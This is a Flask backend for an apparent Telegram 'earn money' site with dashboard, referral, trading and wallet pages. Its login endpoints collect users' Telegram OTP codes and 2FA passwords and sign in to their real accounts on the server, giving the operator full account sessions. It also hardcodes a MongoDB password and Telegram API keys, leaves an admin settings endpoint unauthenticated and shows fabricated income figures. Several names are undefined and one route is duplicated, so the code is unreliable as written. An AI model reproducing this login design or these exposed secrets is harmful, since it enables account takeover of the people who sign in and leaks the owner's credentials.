import os
import os
import asyncio
import random
import time
import uuid
from datetime import datetime, timedelta
from threading import Thread
from functools import wraps
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from flask_cors import CORS
from pymongo import MongoClient
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from bson import ObjectId
import firebase_admin
from firebase_admin import credentials, db

# ---------------------------------------------------------
# ১. কনফিগারেশন ও ডাটাবেস সেটআপ
# ---------------------------------------------------------
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "aaf_strong_secure_786")

# সেশন সিকিউরিটি
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    PERMANENT_SESSION_LIFETIME=timedelta(days=10)
)

@app.before_request
def make_session_permanent():
    session.permanent = True

CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)

# API & DB Credentials
API_ID = 36466824
API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"

# MongoDB কানেকশন
try:
    client_db = MongoClient(MONGO_URI)
    mdb = client_db['aaf_tele_earn_db']
    users_col = mdb['users']
    settings_col = mdb['settings']
    print("MongoDB Connected Successfully!")
except Exception as e:
    print(f"MongoDB Connection Failed: {e}")

# মেম্বারশিপ চেক ফাংশন
def check_membership(user_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember?chat_id={CHANNEL_ID}&user_id={user_id}"
    try:
        res = requests.get(url, timeout=5).json()
        if res.get("ok"):
            status = res['result']['status']
            return status in ['member', 'administrator', 'creator']
    except: return False
    return False

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'uid' not in session:
            return redirect(url_for('index'))
        return f(*args, **kwargs)
    return decorated_function

# --- রাউটস ---
@app.route('/')
def index():
    if 'uid' in session: return redirect(url_for('render_dashboard'))
    return render_template('login.html')

@app.route('/dashboard')
@login_required
def render_dashboard():
    return render_template('dashboard.html')

@app.route('/get_user_data')
@login_required
def get_user_data_api():
    try:
        uid = int(session['uid'])
        user = users_col.find_one({"telegram_id": uid})
        if not user: return jsonify({"error": "User not found"}), 404
        
        is_active = check_membership(uid)
        admin = settings_col.find_one({"type": "global"}) or {}

        return jsonify({
            "user": {
                "username": user.get("name", "User"),
                "telegram_id": uid,
                "cash": f"{user.get('main_balance', 0.0):.2f}",
                "aaf": f"{user.get('aaf_balance', 0):.0f}",
                "total_refer": user.get("refer_count", 0),
                "trading_profit": f"{user.get('trade_profit', 0.0):.2f}",
                "is_active": is_active
            },
            "admin": {
                "server_income": admin.get("server_income", "50,450"),
                "server_trading": admin.get("server_trading", "1,20,000"),
                "total_users": users_col.count_documents({}),
                "banner_ad_code": admin.get("banner_ad_code", ""),
                "channel_url": f"https://t.me/{CHANNEL_ID.replace('@','')}"
            }
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# টেলিগ্রাম OTP লগইন (আগের কোড ঠিক রাখা হয়েছে)
temp_clients = {}

@app.route('/api/send_otp', methods=['POST'])
def send_otp_handler():
    data = request.json
    phone = data.get('phone')
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
        client.connect()
        result = client.send_code_request(phone)
        temp_clients[phone] = {"client": client, "hash": result.phone_code_hash, "loop": loop}
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/verify_login', methods=['POST'])
def verify_login_handler():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    password = data.get('password')
    if phone not in temp_clients: return jsonify({"success": False, "message": "Expired"})
    
    client = temp_clients[phone]["client"]
    h = temp_clients[phone]["hash"]
    loop = temp_clients[phone]["loop"]
    try:
        asyncio.set_event_loop(loop)
        user = client.sign_in(phone, code, phone_code_hash=h, password=password)
        session["uid"] = user.id
        users_col.update_one({"telegram_id": user.id}, {"$set": {"name": user.first_name, "phone": phone}}, upsert=True)
        return jsonify({"success": True, "uid": user.id})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})


# এডমিন সেটিংস আপডেট করার API
# অ্যাডমিন প্যানেল ওপেন করার মেইন রাস্তা (আগের ১৭৩-১৭৭ এর বদলে এটি থাকবে)
@app.route('/admin_panel')
def admin_panel_view():
    return render_template('admin.html')

# কনফিগ এপিআই (আগের ১৩৮-১৫৫ এর বদলে এটি ব্যবহার হবে)
@app.route('/admin/api/config', methods=['GET', 'POST'])
def admin_config():
    if request.method == 'POST':
        data = request.json
        settings_col.update_one(
            {"type": "global"},
            {"$set": {
                "telegram_link": data.get("telegram_link"),
                "trade_fee": data.get("trade_fee"),
                "min_withdraw": data.get("min_withdraw"),
                "join_bonus": data.get("join_bonus")
            }},
            upsert=True
        )
        return jsonify({"success": True})
    
    config = settings_col.find_one({"type": "global"}) or {}
    if '_id' in config: config['_id'] = str(config['_id'])
    return jsonify(config)

# ডাটা দেখানোর জন্য নতুন এপিআই
@app.route('/admin/api/all-data')
def admin_all_data():
    try:
        total_users = users_col.count_documents({})
        return jsonify({
            "total_users": total_users,
            "pending_count": 0,
            "payouts": []
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# পেজ রেন্ডারিং
@app.route('/login')
@login_required
def render_login(): return render_template('login.html')
    
@app.route('/refer_list')
@login_required
def render_refer_list(): return render_template('refer_list.html')

@app.route('/payment_history')
@login_required
def render_payment_history(): return render_template('payment_history.html')
    
@app.route('/task')
@login_required
def render_task(): return render_template('task.html')

@app.route('/trading')
@login_required
def render_trading(): return render_template('trading.html')

@app.route('/wallet')
@login_required
def render_wallet(): return render_template('wallet.html')

@app.route('/account')
@login_required
def render_account(): return render_template('account.html')

@app.route('/')
def home():
    return "Server is Running!"

# এটি অবশ্যই ফাংশনের বাইরে এবং নিচে আলাদাভাবে থাকবে
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False)
